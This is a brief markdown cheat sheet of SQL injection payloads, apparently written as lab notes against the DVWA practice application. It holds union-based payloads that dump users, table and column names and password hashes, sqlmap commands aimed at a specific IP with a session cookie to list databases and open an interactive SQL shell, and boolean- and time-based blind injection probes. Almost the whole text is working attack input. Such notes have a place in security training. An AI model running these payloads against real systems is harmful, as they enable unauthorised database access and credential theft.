# SQL Injection 

##### Dump all users 
```sql
%' or '0'='0
```

##### Manual enumeration 

###### Trying to guess column names 
```sql
%' or '0'='0' union select COLUMN_NAME from information_schema.COLUMNS #
```

###### Find the table and column names 
```sql
%' or '0'='0' union select TABLE_NAME, COLUMN_NAME from information_schema.COLUMNS #
```

##### Dumping password hashes 
```sql
%' or '0'='0' union select user, password from dvwa.users #
```

### Automated 
---

### Using sqlmap 

##### Find backend DB
```sh
python ./sqlmap.py -u "http://161.35.202.77/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=d4ool8gsr78mnro6cas6mrlf35; security=low" --dbs
```

##### Getting an interactive sql shell 
```sh
python ./sqlmap.py -u "http://161.35.202.77/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=d4ool8gsr78mnro6cas6mrlf35; security=low" --sql-shell
```


## Bling SQL injection 

##### Finding blind sqli (boolien based)
```sql
1' and 1 = 1 #
```
##### Finding database name length (boolien based)
```
1' and length(database())=4 #
```

##### Finding blind sqli (time based)
```sql
1' and sleep(5)#
```

##### Determine the first letter of the database name (time-based)
```
1' and if(substr((database()),1,1) = 'a' , sleep(3), 1) #
```




